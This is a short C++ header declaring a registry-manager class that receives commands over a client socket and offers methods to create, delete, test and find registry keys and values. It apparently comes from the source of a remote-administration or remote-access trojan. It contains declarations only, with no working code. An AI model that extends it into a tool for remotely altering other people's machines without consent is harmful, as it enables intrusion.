#pragma once
#include "../../PublicInclude/Manager.h"

class CRegManager : public CManager
{
public:
	CRegManager(CClientSocket* pClient);
	virtual ~CRegManager();
public:
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
protected:
	void TestQWORD(char* buf);
	void TestEXSTR(char* buf);
	void TestDWORD(char* buf);
	void TestSTR(char* buf);
	void CreateKey(char* buf);
	void SendOK();
	void SendNO();
	void DelKey(char* buf);
	void CreatePath(char* buf);
	void DelPath(char* buf);
	void Find(char bToken, char* path);
};

